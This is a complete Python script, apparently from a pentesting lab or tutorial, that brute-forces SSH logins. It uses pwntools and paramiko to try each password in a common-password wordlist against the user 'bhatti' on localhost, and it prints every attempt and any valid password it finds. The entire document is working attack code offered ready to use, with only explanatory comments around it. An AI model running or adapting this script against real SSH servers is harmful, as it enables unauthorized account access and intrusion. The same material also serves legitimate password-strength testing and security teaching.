# Import necessary libraries for SSH connection and exploitation
from pwn import *  # pwntools library for exploit development
import paramiko    # SSH protocol implementation

# Target SSH server configuration
host = "127.0.0.1"     # Target host IP address (localhost in this case)
username = "bhatti"    # Target username to brute force
attempts = 0           # Counter to track number of password attempts

# Open the password list file for reading
with open("ssh-common-passwords.text", "r") as password_list:
    # Iterate through each password in the list
    for password in password_list:
        # Remove newline character from the password
        password = password.strip("\n")

        try:
            # Display current attempt number and password being tried
            print(f"[{attempts}] Attempting password: [{password}]")

            # Attempt SSH connection with current credentials
            # timeout=1 sets connection timeout to 1 second
            response = ssh(host=host, user=username,
                           password=password, timeout=1)

            # Check if connection was successful (valid password)
            if response.connected():
                # Success! Valid password found
                print(f"[>] Valid password found: {password}")
                # Close the SSH connection
                response.close()
                # Exit the loop since we found the password
                break

            # Close connection if it was established but didn't pass connected() check
            response.close()

        # Handle authentication failure (invalid password)
        except paramiko.ssh_exception.AuthenticationException:
            print(f"[X] Invalid Password")

        # Increment attempt counter for each password tried
        attempts += 1
